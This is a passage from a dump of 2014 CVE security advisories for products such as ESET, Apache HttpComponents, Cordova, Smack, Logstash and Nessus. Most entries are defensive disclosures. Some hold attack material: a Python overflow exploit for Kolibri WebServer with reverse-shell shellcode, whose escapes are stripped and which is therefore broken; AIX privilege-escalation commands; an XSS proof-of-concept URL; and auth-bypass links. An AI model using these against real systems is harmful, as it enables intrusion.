Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5307/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6337,CVE-2014-4973 - Privilege Escalation in ESET Windows Products,,CVE-2014-4973,"Vulnerability title: Privilege Escalation in ESET Windows Products
CVE: CVE-2014-4973
Vendor: ESET
Product: ESET Windows Products
Affected version: v5.0 - 7.0 (Firewall Module Build 1183 (20140214) and
earlier)
Fixed version: v6 - v7 (Firewall Module Build 1212 (20140609))
Reported by: Kyriakos Economou
Details:
Versions 5.0 - 7.0 of ESET Smart Security and ESET Endpoint Security
products for Windows XP OS allow a low privileged user to execute code
as SYSTEM by exploiting a vulnerability in the ESET Personal Firewall
NDIS filter (EpFwNdis.sys) kernel mode driver also mentioned as Personal
Firewall module Build 1183 (20140214) and prior. This is a 'trusted
value vulnerability' that can be triggered through a specific IOCTL with
a specifically crafted buffer, to force the driver to validate an
improper IOCTL.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-4973/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6348,[CVE-2014-0232] Apache OFBiz Cross-site scripting (XSS) vulnerability,,CVE-2014-0232,"CVE-2014-0232: Apache OFBiz Cross-site scripting (XSS) vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache OFBiz 11.04.01 to 11.04.04
Apache OFBiz 12.04.01 to 11.04.03
The unsupported Apache OFBiz 09.04.x, 10.04.x versions may be also affected
Description:
Result and error messages returned by some OFBiz services could be a vector for XSS attacks.
Mitigation:
11.04.x users should upgrade to 11.04.05
12.04.x users should upgrade to 12.04.04
http://svn.apache.org/r1608698
Credit:
This issue was discovered by ﻿Gregory Draperi.
References:
http://ofbiz.apache.org/download.html#vulnerabilities"
6354,CVE-2014-3577: Apache HttpComponents client: Hostname verification susceptible to MITM attack,,CVE-2014-3577,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Security Advisory - Apache Software Foundation
Apache HttpComponents / hc.apache.org
Hostname verification susceptible to MITM attack
CVE-2014-3577 / CVSS 1.4
Apache HttpComponents (prior to revision 4.3.5/4.0.2) may be susceptible
to a 'Man in the Middle Attack' due to a flaw in the default hostname
verification during SSL/TLS when a specially crafted server side
certificate is used.
Background
- ----------
During an SSL connection (https) the client verifies the hostname in
the URL against the hostname as encoded in the servers certificate (CN,
subjectAlt fields). This is to ensure that the client connects to the
'real' server, as opposed to something in middle (man in the middle)
that may compromise end to end confidentiality and integrity.
Details
- -------
The flaw is in the default Apache HttpComponents
org.apache.http.conn.ssl.AbstractVerifier
that is used in client mode for verification of hostname of the server
side certificate. It parsed the entire subject distinguished name (DN)
for the occurrence of any <CN=> substring (regardles of field).
Therefore a DN of with a O field such as
O=""foo,CN=www.apache.org”
and a CN of ""www.evil.org” and ordered such that the O appears prior to
the CN field would incorrectly match match on the <www.apache.org> in
the O field as opposed to just the values in the CN and alternative
subject name(s).
The doctored field can be any field but the CN field itself; including
the <E> or emailAddress field as long as it appears before the CN (some
CAs reorder the DN).
A third party in posession of such a doctored certificate and who also
has the ability to intercept or reroute the traffic to a https server
under its control (e.g. through DNS doctoring or various forms of
traffic rerouting or spoofing) can thus perform a 'man in the middle'
attack and compromise end to end confidentiality and integrety.
Note that while some certificate authorities may be relatively strict
on what they allow in the various fields - most are NOT; and allow
for a relatively large amount of leeway in, for example, the OU
and E fields.
Impact:
- -------
A man-in-the-middle can interpose itself between the server and the
code using an affected version of Apache HttpComponents as a client.
Leading to complete loss of end to end confidentiality and end to
end integrety of the connection.
Versions affected:
- ------------------
All versions prior to HttpClient 4.3.5 (including the Android port)
and HttpAsyncClient 4.0.2. The fix was introduced in these versions.
http://search.maven.org/#artifactdetails|org.apache.httpcomponents|
httpclient|4.3.5|jar
http://search.maven.org/#artifactdetails|org.apache.httpcomponents|
httpasyncclient|4.0.2|jar
These have been silently pushed out to Maven central and Apache Dist
as of 2014-08-1. An Android build was released on 2014-08-15.
Resolution
- ----------
A fix has been applied as of revision 1614065 and is part of release
HttpClient 4.3.5 (including HttpClient port for Android against the
official Google Android SDK)and HttpClient (async) 4.0.2.
Upgrading to these versions newer resolves this issue.
Mitigations and work arounds
- ----------------------------
If upgrading to version 4.3.5/4.0.2 is not an option; one could change
the default org.apache.http.conn.ssl.AbstractVerifier of earlier
versions for revision 1614065 of newer.
Note that exploitation of this flaw also requires some level of DNS or
IP spoofing (or existing 'in the middle infrastructure' such as a corporate
proxy or other TCP level equipment en-route). This need may allow for site
specific alternative mitigations.
Reproducing the flaw
- --------------------
If so required; the following statements will allow the testing of a
Apache HttpComponents client against a server with a thus crafted
certificate:
openssl req -new -x509 -keyout /dev/stdout
-subj ""/O=foo, CN=www.apache.org/CN=machine-domain-name/""
-set_serial 86653 -nodes |
openssl s_server -cert /dev/stdin -accept 8443 -www
and a Apache HttpComponents client that connects to
""https://www.apache.org:8443/"" with the DNS entry for www.apache.org
pointing to the machine-domain-name.
Credits and timeline
- --------------------
The flaw was found and reported by Subodh Iyengar <http://www.subodh.io>,
and Will Shackleton <http://www.shackleton.io/> from Facebook. It was
reported on the 23rd of July. A fix was applied by and released on
2014-08-01. An Android build was released on the 2014-08-15. This
security advisory fully discloses the issue and current insights known
to the Apache Software foundation (the vendor).
Apache would like to thank all involved for their help with this.
A similar issue was reported by Florian Weimer of Red Hat in 2012 and
was fixed by https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692442#56.
It has now been assigned CVE-2012-6153.
Common Vulnerability Scoring (Version 2) and vector
- ---------------------------------------------------
CVSS Base Score 5.8
Impact Subscore 4.9
Exploitability Subscore 8.6
CVSS Temporal Score 4.8
CVSS Environmental Score 1.4
Modified Impact Subscore 5.2
------------------------------
Overall CVSS Score 1.4
CVSS v2 Vector
AV:N/AC:M/Au:N/C:P/I:N/A:P/E:F/RL:OF/RC:C/CDP:L/TD:L/CR:H/IR:L/AR:L
1.09 / : 1692 $
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4
Comment: This message is encrypted and/or signed with PGP (gnu-pg, gpg). Contact dirkx webweaving org if you cannot read it.
iQCVAwUBU/GyjDGmPZbsFAuBAQIl+wQAkPN3a4EzlmktJZBCmEvXLrLTAzX5Ay3d
fBjtH6cLgISJTk5TdRxzMneAQldHrvxFZh1Ci3+fhmN/7aHY8FRJHJgeDjWXkSQX
mdg3VabM/alHOa/LunftWqyc3Y2nY8O9vvPZ8xrT6hWXQ6itvAC8T+/HyNsvDbz1
oVdVIRZbjB8=
=huxu
-----END PGP SIGNATURE-----"
6356,CVE-2014-5289 - Kolibri WebServer 2.0 Vulnerable to RCE via Overly Long POST Request,,CVE-2014-5289,"Exploit Details
------------------
Senkas Kolibri WebServer 2.0 (available at http://www.senkas.com/kolibri/download.php) is vulnerable to RCE via an overly long POST request.
Sending the exploit will result in a SEH overwrite, which can then be use to redirect execution to a POP POP RET within the application's binary itself, which once executed, will allow the attacker to execute his/her payload located in the HOST field.
PoC
---------------
A PoC of this exploit follows. This will result in a meterpreter reverse tcp shell to 192.168.62.129 on port 4444. The exploit currently also bypasses ASLR by overwriting the SEH handler with an address from the binary itself. The offset in this exploit was confirmed to work on a Windows 7 Professional machine, fully updated as of August 5th, 2014:
PoC Code
----------------------------------
#!/bin/python
import socket
#[*] x86/alpha_mixed succeeded with size 636 (iteration=1)
buf = ""x45x44x44x43x45x44x44x43"" # TAG
buf += ""x89xe5xdaxddxd9x75xf4x5fx57x59x49x49x49""
buf += ""x49x49x49x49x49x49x49x43x43x43x43x43x43""
buf += ""x37x51x5ax6ax41x58x50x30x41x30x41x6bx41""
buf += ""x41x51x32x41x42x32x42x42x30x42x42x41x42""
buf += ""x58x50x38x41x42x75x4ax49x49x6cx69x78x6e""
buf += ""x66x53x30x35x50x73x30x75x30x6dx59x4ax45""
buf += ""x35x61x4ex32x33x54x6cx4bx31x42x66x50x6c""
buf += ""x4bx62x72x34x4cx6cx4bx73x62x52x34x6ex6b""
buf += ""x72x52x61x38x46x6fx6cx77x51x5ax66x46x45""
buf += ""x61x59x6fx54x71x79x50x4cx6cx75x6cx50x61""
buf += ""x51x6cx65x52x34x6cx47x50x6fx31x4ax6fx64""
buf += ""x4dx57x71x6bx77x4ax42x7ax50x36x32x71x47""
buf += ""x6ex6bx56x32x36x70x4cx4bx53x72x55x6cx4c""
buf += ""x4bx50x4cx42x30x33x48x4bx53x32x6ax56x61""
buf += ""x4ax71x50x51x4cx4bx43x69x67x50x47x71x79""
buf += ""x43x6cx4bx31x59x62x38x68x63x77x4cx51x59""
buf += ""x6ex6bx75x64x6cx4bx36x61x6bx66x44x71x49""
buf += ""x6fx55x61x69x50x4ex4cx4bx71x38x4fx46x6d""
buf += ""x37x71x78x47x65x68x39x70x34x35x7ax54x47""
buf += ""x73x73x4dx79x68x37x4bx33x4dx64x64x70x75""
buf += ""x6ax42x56x38x6cx4bx72x78x75x74x53x31x4e""
buf += ""x33x50x66x4cx4bx54x4cx70x4bx6cx4bx36x38""
buf += ""x65x4cx33x31x4ex33x4ex6bx67x74x4cx4bx76""
buf += ""x61x48x50x6fx79x71x54x51x34x34x64x43x6b""
buf += ""x71x4bx73x51x53x69x32x7ax42x71x79x6fx4d""
buf += ""x30x42x78x43x6fx51x4ax6cx4bx37x62x58x6b""
buf += ""x6dx59x31x4dx45x38x70x33x74x72x63x30x67""
buf += ""x70x75x38x70x77x33x43x46x52x31x4fx42x74""
buf += ""x70x68x62x6cx63x47x65x76x56x67x6bx4fx4b""
buf += ""x65x6cx78x6ex70x76x61x45x50x37x70x45x79""
buf += ""x49x54x76x34x70x50x65x38x76x49x4bx30x52""
buf += ""x4bx45x50x49x6fx4bx65x46x30x50x50x70x50""
buf += ""x76x30x37x30x42x70x47x30x42x70x71x78x48""
buf += ""x6ax76x6fx4bx6fx49x70x39x6fx59x45x5ax37""
buf += ""x50x6ax63x35x71x78x4fx30x6fx58x65x6ex4f""
buf += ""x71x75x38x65x52x43x30x36x71x53x6cx6cx49""
buf += ""x4dx36x73x5ax44x50x43x66x43x67x32x48x6a""
buf += ""x39x49x35x62x54x63x51x59x6fx78x55x4fx75""
buf += ""x59x50x42x54x36x6cx6bx4fx32x6ex65x58x72""
buf += ""x55x7ax4cx30x68x38x70x58x35x6fx52x33x66""
buf += ""x6bx4fx58x55x70x6ax35x50x72x4ax76x64x63""
buf += ""x66x50x57x53x58x66x62x78x59x68x48x43x6f""
buf += ""x79x6fx7ax75x6cx4bx65x66x72x4ax73x70x65""
buf += ""x38x65x50x34x50x67x70x37x70x73x66x32x4a""
buf += ""x43x30x55x38x43x68x4dx74x31x43x4bx55x39""
buf += ""x6fx79x45x6ex73x42x73x31x7ax75x50x32x76""
buf += ""x76x33x43x67x51x78x56x62x49x49x39x58x61""
buf += ""x4fx69x6fx48x55x57x71x59x53x55x79x7ax66""
buf += ""x4fx75x79x66x70x75x68x6cx4ax63x41x41""
egghunter = ""x66x81xcaxffx0fx42x52x6ax02x58xcdx2ex3cx05x5ax74xefxb8x45x44x44x43x8bxfaxafx75xeaxafx75xe7xffxe7""
overflow = ""A"" * 12
overflow += ""A"" * (790 - len(overflow) - len(egghunter))
overflow += egghunter
overflow += ""xEBxD9"" # This offset seems to work against Windows 7 Professional, fully updated as of August 5th, 2014
overflow += ""A"" * 2
overflow += ""x50x45x62"" #SEH overwrite 00624550 aka pop pop ret from the binary itself.
# A lot of this is the same as exploit 34059 from exploit-db
buffer = ""POST /"" + overflow + "" HTTP/1.1 ""
buffer += ""User-Agent: Wget/1.13.4 ""
buffer += ""Host: "" + buf + "" ""
buffer += ""Accept: */* ""
buffer += ""Connection: Keep-Alive ""
buffer += ""Content-Type: application/x-www-form-urlencoded ""
buffer += ""Content-Length: 4""
buffer += "" ""
buffer += ""licenseID=string&content=string&paramsXML=string""
handle = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
handle.connect((""192.168.62.130"", 8080))
handle.send(buffer)
handle.close()
Conclusion
---------------------
Senkas has responded to previous posts about vulnerabilities in this software, namely CVE-2014-4158 which results in RCE via an overly long GET request, and CVE-2010-5301, which results in RCE via an overly long HEAD request, with the statement, ""Please note there are number of reported ""security vulnerabilities"" for Kolibri webserver. So let me clarify that Kolibri+ is not secure and will never be secure for the same reason bicycles don't have airbags.""
For this reason I believe it is unlikely that this vulnerability will be patched considering that the other two vulnerabilities remain unpatched to this day.
From a quick reverse engineering of this target I believe that these three vulnerabilities all occur in the same piece of code that responds to requests for invalid pages, as a record of the invalid page request is stored on the stack, however I did not confirm that this is the case, and this remains to be proven.
Please feel free to question me if you require any more information to replicate this bug or if any part of this is confusing at all."
6367,CVE-2014-5035 - Opendaylight Vulnerable to Local and Remote File Inclusion in the Netconf (TCP) Service,,CVE-2014-5035,"Title
===================
Opendaylight Vulnerable to Local and Remote File Inclusion in the Netconf (TCP) Service
Summary
===================
Opendaylight (www.opendaylight.com) is vulnerable to Local and Remote File Inclusion in the Netconf (TCP) Service via an External Entity Injection (XXE).  Opendaylight’s netconf service, when receiving an XML-RPC message, will process any external entities referenced in that message, local or remote.  And will do so using its own running credentials which are root.  So by injecting a reference to a local file, you can extract any file you like from the running system including the shadow file which can be leveraged by an attacker to perform an offline password attack.
Affected Products
===================
Opendaylight 1.0 (Hydrogen) – Base, Virtualization, and Service Provider Editions
CVE
===================
CVE-2014-5035
Details
===================
“To Be Released Later”
Impact
===================
Information Disclosure.  Disclosure of hashed system credentials, which enables mounting of offline password attacks.  Eventual disclosure of clear-text system credentials.
Credits
===================
Gregory Pickett (@shogun7273), Hellfire Security
----------
Gregory Pickett, CISSP, GCIA, GPEN "
6368,Apache Cordova 3.5.1: CVE-2014-3502 update,,CVE-2014-3502,"The following text is amended from the original that was sent on August 4th. More background information on this amendment can be found at http://cordova.apache.org/announcements/2014/08/06/android-351-update.html
Android Platform Release: 04 Aug 2014
CVE-2014-3502: Cordova apps can potentially leak data to other apps via URL
loading
Severity: Medium
Vendor:
The Apache Software Foundation
Versions Affected:
Cordova Android versions up to 3.5.0
Description:
Android applications built with the Cordova framework can launch other
applications through the use of anchor tags, or by redirecting the webview to
an Android intent URL. An attacker who can manipulate the HTML content of a
Cordova application can create links which open other applications and send
arbitrary data to those applications. An attacker who can run arbitrary
JavaScript code within the context of the Cordova application can also set the
document location to such a URL. By using this in concert with a second,
vulnerable application, an attacker might be able to use this method to send
data from the Cordova application to the network.
The latest release of Cordova Android takes steps to block explicit Android
intent urls, so that they can no longer be used to start arbitrary applications
on the device.
Implicit intents, including URLs with schemes such as ""tel"", ""geo"", and ""sms""
can still be used to open external applications by default, but this behaviour
can be overridden by plugins.
Upgrade path:
Developers who are concerned about this should rebuild their applications with
Cordova Android 3.5.1.
Credit:
This issue was discovered by David Kaplan and Roee Hay of IBM Security Systems."
6392,(CVE-2014-3501/2/3) Apache Cordova for Android - Multiple Vulnerabilities,,CVE-2014-3501,"Hi,
We have recently discovered a severe Cross-Application Scripting (XAS) vulnerability in Apache Cordova for Android. This vulnerability enables theft of sensitive information from Crodova-based apps both locally by malware and also remotely by using drive-by exploitation techniques.
In addition, we have also found a set of vulnerabilities which allow for data exfiltration to an arbitrary target, bypassing Cordova's whitelisting mechanism. 
The CVE identifiers are:
CVE-2014-3500: Cross-Application Scripting via Android Intents
CVE-2014-3501: Cordova whitelist bypass for non-HTTP URLs
CVE-2014-3502: Data Leak to Other Applications via Android Intent URIs
We had privately reported the issues to Cordova and CVE-2014-3100 has been fixed in Cordova 3.5.1. See our whitepaper for details on how to mitigate CVE-2014-3501 and CVE-2014-3502. 
More details (including a video demo of a working exploit) are available at:
1. Blog: http://securityintelligence.com/apache-cordova-phonegap-vulnerability-android-banking-apps/
2. Advisory: https://www.slideshare.net/ibmsecurity/remote-exploitation-of-the-cordova-framework/
- Roee Hay & David Kaplan"
6408,CVE-2014-5075 MitM Vulnerability in the Smack XMPP Library for Java,,CVE-2014-5075,"CVE-2014-5075 MitM Vulnerability in the Smack XMPP Library for Java
===================================================================
Smack <http://www.igniterealtime.org/projects/smack/> is an Open Source
XMPP (Jabber) client library for instant messaging and presence written
in Java. Smack prior to version 4.0.2 is vulnerable to TLS
Man-in-the-Middle attacks, as it fails to check if the server
certificate matches the hostname of the connection.
Affected versions
-----------------
- Smack 4.0.0 and 4.0.1 are vulnerable.
- Smack 2.x and 3.x are vulnerable if a custom `SSLContext` is
supplied via `connectionConfiguration.setCustomSSLContext()`.
Details
-------
Smack is using Java's `SSLSocket`, which checks the peer certificate
using an `X509TrustManager`, but does not perform hostname verification.
Therefore, it is possible to redirect the traffic between a Smack-using
application and a legitimate XMPP server through the attacker's server,
merely by providing a valid certificate for a domain under the
attacker's control.
In Smack versions 2.2.0 to 3.4.1, a custom `ServerTrustManager`
implementation was used, which was supplied with the connection's server
name, and performed hostname verification. However, it failed to verify
the basicConstraints and nameConstraints of the certificate chain
(CVE-2014-0363, http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0363)
and has been removed in Smack 4.0.0.
Applications using Smack 2.2.0 to 3.4.1 with a custom `TrustManager` did
not benefit from `ServerTrustManager` and are vulnerable as well, unless
their own `TrustManager` implementation explicitly performs hostname
verification.
Mitigation
----------
Users of the Smack library are advised to upgrade to Smack 4.0.2, and
then use `connectionConfiguration.setHostnameVerifier()` with a
reasonable `HostnameVerifier` implementation. A proper hostname verifier
**MUST** be configured to close the vulnerability.
For Smack 3.x users, a backported commit has been created:
https://github.com/ge0rg/smack/commit/8d483b25bda7ae86a3f3e83217c2add6d710798a
Here, a `HostnameVerifier` implementation needs to be
supplied via `connectionConfiguration.setHostnameVerifier()` as well.
When using the official JRE, the internal class
`sun.security.util.HostnameChecker` can be wrapped as described
here:
http://kevinlocke.name/bits/2012/10/03/ssl-certificate-verification-in-dispatch-and-asynchttpclient/
If Apache's HttpClient library is available, its `StrictHostnameVerifier` can
be used.
On Android, MemorizingTrustManager provides both certificate checking and
hostname verification with interactive fallback, allowing the user to decide
about the trustworthiness of a server:
https://github.com/ge0rg/MemorizingTrustManager/
Affected Applications
---------------------
Smack is a library used by different applications. Therefore, the
authors of the following Smack-based applications have been contacted to
coordinate updated releases:
- ChatSecure (fixed in 13.2.0-beta1)
- GTalkSMS (contacted on 2014-07-28)
- MAXS (fixed in 0.0.1.18)
- yaxim and Bruno (fixed in 0.8.8)
- *undisclosed Android application* (contacted on 2014-07-21)
The following Smack-based applications were not affected:
- TransVerse (special interest client)
- Xabber (using a custom `TrustManager` performing hostname verification)
Timeline
--------
- 2014-07-20 Discovery of Smack vulnerability, notification of Smack
maintainer
- 2014-07-21 Notification of vulnerable apps' authors
- 2014-07-27 Release of Smack 4.0.2
- 2014-08-01 Release of MAXS 0.0.1.18
- 2014-08-04 Release of yaxim 0.8.8
- 2014-08-05 Release of ChatSecure 13.2.0 beta 1
- 2014-08-05 Publication of this advisory
Links
-----
Online version of advisory:
http://op-co.de/CVE-2014-5075.html
PDF version:
http://op-co.de/CVE-2014-5075.pdf
--
Dr. Georg Lukas
rt-solutions.de GmbH
Oberländer Ufer 190a
D-50968 Köln
Tel. : (+49)221 93724 0
Fax : (+49)221 93724 50
Mobil: (+49)179 4176591
Web : www.rt-solutions.de"
6413,CVE-2014-2595 - Authentication Bypass in Barracuda Web Application Firewall,,CVE-2014-2595,"Vulnerability title: Authentication Bypass in Barracuda Web Application
Firewall
CVE: CVE-2014-2595
Vendor: Barracuda
Product: Web Application Firewall
Affected version: Firmware v7.8.1.013
Fixed version: N/A
Reported by: Nick Hayes
Details:
It is possible to re-use a link which includes a non-expiring
authentication token in the query string to gain access to the interface
of the Barracuda Web Application Firewall (WAF) firmware version 7.8.1.013.
Example:
http://waf.ptest.cudasvc.com/cgi-mod/index.cgi?auth_type=Local&et=99999999996locale=en_US&password=5a2fd48b65c5d80881eeb0f738bcc6dc&primary_tab=SECURITY%20POLICIES&secondary_tab=request_limits&user=guest
The above link opens up the Request Limit Policies on the Barracuda labs
WAF test host as the Guest user. This has been confirmed to work on
actual devices and with administrative accounts.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2595/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6485,CVE-2014-4326 Remote command execution in Logstash zabbix and nagios_nsca outputs.,,CVE-2014-4326,"Vendor: Elasticsearch
Product: Logstash
CVE: CVE-2014-4326
Affected versions: Logstash 1.0.14 through 1.4.1
Recommendations: All affected users should upgrade to Logstash 1.4.2.
We also provide patch instructions for Logstash 1.3.x at the bottom of
this note.
The vulnerability impacts deployments that use either the zabbix or
the nagios_nsca outputs. In these cases, an attacker with an ability
to send crafted events to any source of data for Logstash could
execute operating system commands with the permissions of the Logstash
process.
Deployments that do not use the zabbix or the nagios_nsca outputs are
not vulnerable and do not need to upgrade for this reason.
We would like to thank Jan Karwowski and Danila Borisiuk for reporting
the issue and working with us on the resolution.
Related links:
http://www.elasticsearch.org/blog/logstash-1-4-2/
Logstash 1.3.x patch instructions:
mkdir -p /tmp/logstash-patch/logstash/
outputs
wget -O /tmp/logstash-patch/logstash/outputs/zabbix.rb
https://github.com/elasticsearch/logstash-contrib/raw/v1.4.2/lib/logstash/outputs/zabbix.rb
wget -O /tmp/logstash-patch/logstash/outputs/nagios_nsca.rb
https://github.com/elasticsearch/logstash/raw/v1.4.2/lib/logstash/outputs/nagios_nsca.rb
jar uf logstash-1.3.3-flatjar.jar -C /tmp/logstash-patch/
logstash/outputs/zabbix.rb -C /tmp/logstash-patch/
logstash/outputs/nagios_nsca.rb
SHA256 of the two files fetched for this patch process:
9f86c2ba1940d507f54fffee209bbdcf43a658973c99c2f8bded1e36b31c21d7
./logstash/outputs/zabbix.rb
2982178fabbf3de5d40e9bbfb1320d3466338371611d77e22804d21caa8e135f
./logstash/outputs/nagios_nsca.rb"
6487,CVE-2014-4980 Parameter Tampering in Nessus Web UI - Remote Information Disclosure,,CVE-2014-4980,"Product: Nessus
Vendor: Tenable Network Security
Version: Nessus 5.2.3-5.2.7 - Web UI 2.3.4 (potentially lower)
Vendor Notified Date: June 24, 2014
Vendor Resolved Date: June 25, 2014
Release Date: July 18, 2014
Risk: Medium
Authentication: Not Required
Remote: Yes
Description:
A parameter tampering vulnerability exists in Nessus 5.2.7 and potentially below that allows remote attackers to retrieve potentially sensitive information from the server via the Nessus Web UI. By not checking each parameter, an attacker can retrieve information meant for authenticated users.
Successful exploitation of this vulnerability resulted in retrieving the following data without authentication, which can assist an attacker to launching further attacks:
Plugin Set, Server uuid, Web Server Version, Nessus UI Version, Nessus Type, Notifications, MSP, Capabilities, Multi Scanner, Multi User, Tags, Reset Password, Report Diff, Report Email Config, Report Email, PCI Upload, Plugin Rules, Plugin Set, Idle Timeout, Scanner Boot time, Server Version, Feed, and Status.
Exploit steps for proof-of-concept:
1. Navigate to http://vulnerablehost.com/server/properties?token= and observe the returned content.
2. Navigate to http://vulnerablehost.com/server/properties?token=1 and observe the newly returned content meant for authenticated sessions.
Vendor Response: Fix was added to Web UI 2.3.5 on June 25, 2014.
Reference:
CVE-2014-4980
http://www.halock.com/blog/cve-2014-4980-parameter-tampering-nessus-web-ui/
http://www.tenable.com/security/tns-2014-05
Credit:
Robert Gilbert
HALOCK Security Labs"
6543,CVE-2014-4331 OctavoCMS reflected XSS vulnerability,,CVE-2014-4331,"This proprietary content management software is vulnerable to reflected XSS on the file admin/viewer.php, src parameter.
Current release on their demo site is vulnerable, same as other few sites I could find.
PoC: http://demo.octavocms.com/admin/viewer.php?src=%22%3E%3C/img%3E%3Ch2%3EThis%20is%20a%20test%3C/h2%3E%3Cscript%3Ealert(123)%3C/script%3E%3C!--%22
On the 9th of June I contacted the guys of OctavoCMS and eMB Group but they have not replied yet. At the moment of this writing the on-line demo still vulnerable."
6549,CVE-2014-3074 - Runtime Linker Allows Privilege Escalation Via Arbitrary File Writes in IBM AIX,,CVE-2014-3074,"Vulnerability title: Runtime Linker Allows Privilege Escalation Via
Arbitrary File Writes in IBM AIX
CVE: CVE-2014-3074
Vendor: IBM
Product: AIX
Affected version: AIX 6.1 and 7.1 and VIOS 2.2.*
Reported by: Tim Brown
Details:
It has been identified that the runtime linker allows privilege
escalation via arbitrary file writes with elevated privileges (SetGID
and SetUID programs). The following will cause a new file /etc/pwned to
be created with permissions of rw-rw-rw:
umask 0
MALLOCOPTIONS=buckets
MALLOCBUCKETS=number_of_buckets:8,bucket_statistics:/etc/pwned
export MALLOCOPTIONS MALLOCBUCKETS
su -
In instances where the output file exists, then the report_allocations
output will be appended to the existing file and the permissions preserved.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3074/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6560,[SECURITY] CVE-2014-3503 Apache Syncope,,CVE-2014-3503,
6563,CVE-2014-3863 - Stored XSS in JChatSocial,,CVE-2014-3863,"CVE-2014-3863
===================
""Stored Cross-Site Scripting (XSS)"" (CWE-79) vulnerability in
""JChatSocial"" Joomla extension.
Vendor
===================
Joomla! Extensions Store
Product
===================
JChatSocial: the Joomla live chat
""JChatSocial is a powerful chat system for Joomla with a look so similar
to Facebook chat and it's easy to install and configure. Users can
choose to start a private chat or join a group conversation, all
completely free of charge because data stream is processed on your
server. In addition JChatSocial integrates with Skype software to start
video calls directly within your Joomla! site, and has many advanced
feature such as attachments exchange, avatars and more. "" - source:
http://storejoomla.org/extensions/jchatsocial.html
Affected versions
===================
This vulnerability affects versions of JChatSocial version 2.2 and
probably lower
Solution
===================
The vendor has fixed the issue within few ours after receiving the
vulnerability details, on 29.05.2014
Reported by
===================
This issue was reported to the vendor by Teodor Lupan following a
responsible disclosure process.
Severity
===================
High
Exploitability
===================
Easy: no user interaction required
Description
===================
The discovered Stored Cross Site Scripting can be used by anonymous
users (unregistered) or on some setups - registered users - to target
any other user types, including (Joomla) administrators, and execute any
XSS attack type - like steal their session ID.
Vulnerability details:
In an active JChat window, it is possible to upload a file and send it
to any other connected user. An attacker could insert
malicious JavaScript code into the 'filename' input parameter which will
be included into the active chat window and executed by the browser
of the target without user interaction.
--
Teodor Lupan - LPT, CEH, OSCP
Technical Director
Strada Doamna Cheajna nr. 1-3,
etaj 4, Birou 7, Sector 3,
cod 31233, Bucureşti, România
Tel/Fax: +4 021 316 05 65
Mobil: +4 0723 010 220
e-mail: teodor.lupan safetech ro
Web: www.safetech.ro"
6564,Re: Android KeyStore Stack Buffer Overflow (CVE-2014-3100),,CVE-2014-3100,"Hi,
We have just released an App to check if your device is affected by this bug:
https://play.google.com/store/apps/details?id=com.actisec.keystorescanner
Thanks.
Arturo"
6574,"CVE-2014-3149 - Reflected Cross-Site Scripting (XSS) in ""Invision Power IP.Board""",,CVE-2014-3149,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-3149
===================
""Reflected Cross-Site Scripting (XSS)"" (CWE-79) vulnerability in ""Invision Power IP.Board"" product
Vendor
===================
Invision Power Services Inc.
Product
===================
IP.Board
""IP.Board is the leading solution for creating an engaging discussion forum on the web.
Trusted by thousands of forums, large and small."" - source: https://www.invisionpower.com/apps/board/
Affected versions
===================
This vulnerability affects versions of IP.Board prior 3.4.6 as well as versions 3.3.x
Patch
===================
The vendor has released patches for versions 3.4.x and 3.3.x at
http://community.invisionpower.com/topic/399747-ipboard-33x-34x-security-update/
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Low
Exploitability
===================
Clickjacking or social engineering required
Description
===================
Using a specially crafted request to access the web forum software IP.Board it
is possible to execute Reflected Cross-Site Scripting (XSS) attacks. Due to a
token-based CSRF protection the actual exploitation is somewhat limited, since
attackers have to trick victims (using Clickjacking or social engineering)
into submitting an attacker supplied content.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
References
===================
http://community.invisionpower.com/topic/399747-ipboard-33x-34x-security-update/
